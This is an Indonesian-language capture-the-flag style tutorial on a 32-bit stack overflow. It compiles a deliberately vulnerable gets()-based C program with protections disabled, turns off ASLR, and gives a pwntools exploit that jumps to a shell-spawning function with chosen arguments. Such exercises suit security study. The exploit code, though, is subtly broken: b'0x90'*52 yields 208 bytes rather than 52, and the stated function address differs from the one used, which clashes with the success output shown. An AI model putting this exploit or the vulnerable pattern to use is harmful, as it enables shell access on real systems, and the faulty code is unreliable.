[x] NO Canary ~ -fno-stack-protector
[x] NO PIE ~ -no-pie
[x] NO NX ~ -z execstack
[x] NO ASLR ~ echo 0 > /proc/sys/kernel/randomize_va_space


tantangan kali ini meningkat menjadi 

```c
#include<stdio.h>

void hackrich(int a, int b)
{
    if(a==0x10 && b==0x15)
    {
        printf("Hacked !!!!!\n");
        system("/bin/sh");
    }
    else if(a==0x10)
    {
	    printf("your second parameter is wrong!! \n");
    }
    else
    {
	    printf("you are NOOB !!\n");
    }
}

void foo()
{
    char buffer[40];
    puts("give me your input :)\n");
    gets(buffer);
}

void main()
{
    foo();
}
```

kita tidak bisa langsung mengarahkan EIP ke hackrich saja karena param a dan b harus juga di set sesuai source code yaitu param a = 0x10 dan param b = 0x15

kita kompile dengan cara seperti ini untuk supaya tidak ada perlindungan Canary,NX,PIE

```bash
gcc -g -m32 -fno-stack-protector -z execstack -no-pie -o vuln32 vuln_program.c
```

setting disable untuk perlindungan ASLR pada sistem operasi linux

```bash
echo 0 > /proc/sys/kernel/randomize_va_space
```

jalankan program vuln32 dengan gdb kemudian lakukan checksec

```bash
$gdb -q vuln32
gdb-peda$ checksec 
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
```

berikut ini stack frame untuk program 32bit untuk fungsi dengan parameter

![[stack-frame-fungsi dengan parameter.png]]

dicari lokasi fungsi hackrich

```bash
gdb-peda$ pdisass hackrich
Dump of assembler code for function hackrich:
   0x08049182 <+0>: push   ebp
   0x08049183 <+1>: mov    ebp,esp
   0x08049185 <+3>: push   ebx
```

untuk mengekploitasinya seperti berikut

```python
# padding --> 52
# hackrich --> 0x8049176

from pwn import *

p = process('./vuln32')
print(p.recv())
padding = b'0x90'*52
hackrich = p32(0x08049182)
ret_address = p32(0x0)
param_a = p32(0x10)
param_b = p32(0x15)
p.sendline(padding+hackrich+ret_address+param_a+param_b)
print(p.clean())
p.interactive()
```

hasilnya 

```bash
python3 exploit.py 
[+] Starting local process './vuln32': pid 16054
b'give me your input :)\n'
b'\nHacked !!!!!\n'
[*] Switching to interactive mode
$
```